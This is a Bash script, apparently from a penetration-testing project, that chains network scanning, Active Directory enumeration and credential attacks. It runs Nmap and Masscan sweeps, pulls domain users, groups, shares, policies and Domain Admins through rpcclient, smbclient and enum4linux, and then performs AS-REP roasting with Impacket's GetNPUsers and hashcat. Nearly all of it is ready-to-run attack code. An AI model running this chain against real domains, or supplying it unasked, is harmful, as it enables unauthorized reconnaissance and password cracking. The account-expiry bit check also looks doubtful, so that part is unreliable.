#!/bin/bash

# Function to perform advanced scanning by using Nmap for TCP and Masscan for UDP ports.
function ADVANCED_SCAN {
    # Target network to scan
    echo "Starting Advanced Scanning..."
    echo "Scanning for all open TCP ports, please wait..."

    # Run a comprehensive Nmap scan and save the output
    nmap -p- -Pn -T4 "$target_network" -oN nmap_res.txt > /dev/null 2>&1

    # Define file to store final list of IPs and open ports
    output_file="nmap_hosts_with_ports.txt"
    > "$output_file"  # Clear the output file before adding new results

    # File to store Masscan results for UDP ports
    masscan_output_file="masscan_results.txt"
    > "$masscan_output_file"  # Clear Masscan results file before writing

    # Filter the nmap output to exclude unwanted IPs (.2, .254, and the local_ip) - ***Consider to remove***
    # Append the filtered results to the log file
    # Using awk -v to pass external variable ($local_ip)
    echo -e "\n==== Nmap scan output for $target_network ====\n" >> "$log_file"
    awk -v local_ip="$local_ip" '
        # When a line contains "Nmap scan report for", extract the IP and determine if it should be skipped
        /^Nmap scan report for/ {
            ip = $5
            # Skip IPs ending with .2 or .254, or matching local_ip
            skip = (ip ~ /\.2$/ || ip ~ /\.254$/ || ip == local_ip)
        }
        # Only print lines where the IP is not skipped
        !skip { print }
    ' nmap_res.txt >> "$log_file"

    # Nmap footer
    echo -e "\n==== End of Nmap scan results for $target_network ====\n" >> "$log_file"

    # Extract open ports for each IP and run Masscan for UDP ports
    grep "Nmap scan report" nmap_res.txt | while read -r line; do
        ip=$(echo "$line" | awk '{print $5}')
        
        # Skip certain IPs based on patterns
        if [[ $ip =~ \.2$ || $ip =~ \.254$ || $ip == "$local_ip" ]]; then
            echo "Skipping IP: $ip (excluded IP pattern)"
            continue
        fi

        # Initialize a string to hold the open ports for this IP
        ports=""

        # Capture open ports for the specific IP from the Nmap scan results
        capture=false  # Start with not capturing anything
        while read -r nmap_line; do
            if [[ "$nmap_line" =~ "Nmap scan report for $ip" ]]; then # If the variable 'nmap_line' contains the string "Nmap scan report for" followed by the value in 'ip'
                capture=true  # Start capturing once the scan for this IP starts
            elif [[ "$nmap_line" =~ "Nmap scan report for" && "$capture" == true ]]; then # If 'nmap_line' contains the string "Nmap scan report for" and 'capture' is set to true
                capture=false  # Stop capturing once the next scan report starts
            fi

            # If we're in the capturing phase and the line contains "open", extract the port number
            if [[ "$capture" == true && "$nmap_line" =~ "open" ]]; then
                port=$(echo "$nmap_line" | cut -d '/' -f 1)  # Extract the port number
                ports+="$port,"  # Add the port to the list
            fi
        done < nmap_res.txt  # Process nmap_res.txt line by line

        # Remove trailing comma from the port list
        ports=${ports%,}

        # If open ports are found, save them to the output file
        if [ -n "$ports" ]; then
            echo "$ip: $ports" >> "$output_file"
        fi

        # Run Masscan for UDP ports on this IP and save the result to the Masscan output file
        echo "Running Masscan on $ip for UDP ports..."
        masscan "$ip" -pU:1-65535 --rate 10000 2>/dev/null >> "$masscan_output_file"
    done
   
    echo "Scanning complete."

    # After processing all IPs, append the Masscan results to the main log file
    echo -e "\n==== Masscan UDP results for $target_network ====\n" >> "$log_file"  # Masscan header
    cat "$masscan_output_file" >> "$log_file"  # Append Masscan results
    echo -e "\n==== End of Masscan UDP results for $target_network ====\n" >> "$log_file"  # Masscan footer
}


# Function to gather Active Directory information such as users, groups, shares, and more.
function ADVANCED_ENUM {
    # Output files for storing gathered information
    dom_users="$results_dir/domain_users.txt"
    dom_groups="$results_dir/domain_groups.txt"
    dom_shares="$results_dir/domain_shares.txt"
    dom_policy="$results_dir/domain_policy.txt"
    dom_admins="$results_dir/domain_admins.txt"
    dom_disabled="$results_dir/domain_disabled.txt"
    dom_nonexpire="$results_dir/domain_never_expire.txt"
    
    # Clear old content in the files
    > "$dom_users"
    > "$dom_groups"
    > "$dom_shares"
    > "$dom_policy"
    > "$dom_admins"
    > "$dom_disabled"
	  
    # Loop through each domain controller and gather Active Directory data
    for target_ip in "${domain_controllers[@]}"; do
    	echo -e "\nGathering Active Directory information for target: $target_ip"
    	echo -e "this may take a while, please wait..."
        echo -e "\n[+] Scanning target IP: $target_ip" >> "$dom_users"

        # 1. Extract domain users
        echo -e "\n==== Domain Users for $target_ip ====\n" >> "$dom_users"
        rpcclient -U "$domain_name\\$ad_username%$ad_password" "$target_ip" -c enumdomusers | awk -F'[][]' '{print $2}' >> "$dom_users"
        
        # 2. Extract domain groups
        echo -e "\n==== Domain Groups for $target_ip ====\n" >> "$dom_groups"
        rpcclient -U "$domain_name\\$ad_username%$ad_password" "$target_ip" -c enumdomgroups | awk -F'[][]' '{print $2}' >> "$dom_groups"

        # 3. Extract shares
        echo -e "\n==== Domain Shares for $target_ip ====\n" >> "$dom_shares"
        smbclient -L //"$target_ip"/ -U "$ad_username%$ad_password" 2>/dev/null >> "$dom_shares"

        # 4. Extract password policy
        echo -e "\n==== Password Policy for $target_ip ====\n" >> "$dom_policy"
        enum4linux -a -u "$ad_username" -p "$ad_password" "$target_ip" > enum4linux_output.txt
        sed -n '/Password Policy Information/,/Minimum Password Length/p' enum4linux_output.txt | sed 's/\x1b\[[0-9;]*m//g' >> "$dom_policy"
		cat "$dom_policy"
		
        # 5. Find disabled accounts
        echo -e "\n==== Disabled Accounts at $target_ip ====\n" >> "$dom_disabled"
        grep "acb:.*1 " enum4linux_output.txt | awk -F'Account: ' '{print $2}' | awk '{print $1}' >> "$dom_disabled"

        # 6. Find never-expired accounts
		# Header
		echo -e "\n==== Never-Expired Accounts at $target_ip ====\n" >> "$dom_nonexpire"

		# Search for lines containing "acb:" in the enum4linux output file and process them one by one
		grep "acb:" enum4linux_output.txt | while read line; do
			# Extract the hexadecimal acb value using a regular expression (matches strings like "acb: 0x<hex_value>")
			acb_hex=$(echo $line | grep -oP 'acb: 0x[0-9a-fA-F]+')
			
			# Extract the account name from the line using a regular expression (matches strings like "Account: <account_name>")
			account=$(echo $line | grep -oP 'Account: \K\w+')
			
			# Remove the "acb: 0x" prefix from the acb value to get the actual hex value
			acb_value=$(echo $acb_hex | sed 's/acb: 0x//')
			
			# Convert the hex acb value to decimal
			acb_dec=$((16#${acb_value}))
			
			# Check if the 16th bit is set in the acb value, indicating that the account never expires
			if (( acb_dec & 0x10000 )); then
				# If the account never expires, append the account name to the "$dom_nonexpire" file
				echo $account >> "$dom_nonexpire"
			fi
		done
		
        # 7. Find and display Domain Admins group members
		echo -e "\n==== Domain Admins at $target_ip ====\n" >> "$dom_admins"  # Write header to $dom_admins
		grep -w '512' enum4linux_output.txt | awk -F'\\' '{print $2}' | grep -v "Domain Admins" >> "$dom_admins"  # Append domain admins to $dom_admins
		
		# Capture the output for the current IP
		current_output=""
		current_output+="\n==== Domain Admins at $target_ip ====\n"
		current_output+=$(grep -w '512' enum4linux_output.txt | awk -F'\\' '{print $2}' | grep -v "Domain Admins") # Append lines containing '512', extract the second field, and exclude 'Domain Admins' from 'enum4linux_output.txt'
		echo -e "${green}$current_output${NC}"  # Display only the output for the current IP in the terminal
    done

    # Append all gathered information into the log file
    cat "$dom_users" >> "$log_file"
    cat "$dom_groups" >> "$log_file"
    cat "$dom_shares" >> "$log_file"
    cat "$dom_policy" >> "$log_file"
    cat "$dom_admins" >> "$log_file"
    cat "$dom_disabled" >> "$log_file"
    cat "$dom_nonexpire" >> "$log_file"
}

# Function to perform an advanced exploitation attack by cracking Kerberos tickets.
function ADVANCED_EXPLOIT {
    for target_ip in "${domain_controllers[@]}"; do
        echo "[*] Processing DC: $target_ip"

        # Step 1: Request AS-REP hashes using Impacket's GetNPUsers
        python3 /opt/impacket/examples/GetNPUsers.py -dc-ip "$target_ip" "$domain_name/$ad_username:$ad_password" -request >> "$current_dir/hashes.txt"

        echo "[*] Attempting to crack Kerberos tickets"
        
        # Write headers for cracked ticket results
        echo -e "\n==== Cracked Tickets for $target_ip ====\n" >> "$log_file"
        
        # Step 2: Crack AS-REP hashes using hashcat
        hashcat -m 18200 "$current_dir/hashes.txt" "$password_list" -o "$results_dir/cracked.txt" &> /dev/null

        # Step 3: Change permissions so the cracked ticket file is readable
        sudo chmod 644 "$results_dir/cracked.txt"
        
        # Append cracked results to the log file
        cat "$results_dir/cracked.txt" >> "$log_file"
        echo "Ticket Cracking Completed!"
        echo ""
    done
}

